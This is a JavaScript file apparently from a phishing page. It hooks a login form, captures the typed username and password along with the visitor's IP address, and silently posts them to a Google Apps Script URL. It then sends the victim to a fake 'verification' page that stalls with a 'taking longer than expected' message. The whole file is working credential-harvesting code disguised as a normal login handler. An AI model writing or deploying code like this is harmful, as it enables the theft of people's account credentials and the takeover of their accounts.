document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.querySelector('.login-form');
    
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            try {
                // Get form values
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                // Get user's IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();

                // Prepare data for submission
                const formData = new FormData();
                formData.append('username', username);
                formData.append('password', password);
                formData.append('ipAddress', ipData.ip);

                // Submit data to Google Apps Script
                const response = await fetch('https://script.google.com/macros/s/AKfycbxFktKFDovckl03OZkI0OSM2JLUJ2xvFztTB1aSxyqTf8LwwloJZnomiBAU-rSUgEqY/exec', {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });

                // Store the submission time
                localStorage.setItem('formSubmissionTime', new Date().getTime());

                // Redirect to verification page
                window.location.href = 'verification.html';
                
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred while submitting the form. Please try again.');
            }
        });
    }

    // Check if we're on the verification page
    if (window.location.pathname.includes('verification.html')) {
        // Add a timeout to show error if taking too long
        setTimeout(() => {
            const statusMessage = document.querySelector('.status-message');
            if (statusMessage) {
                statusMessage.textContent = 'Verification is taking longer than expected. Please try again.';
            }
        }, 10000); // Show error after 10 seconds
    }
}); 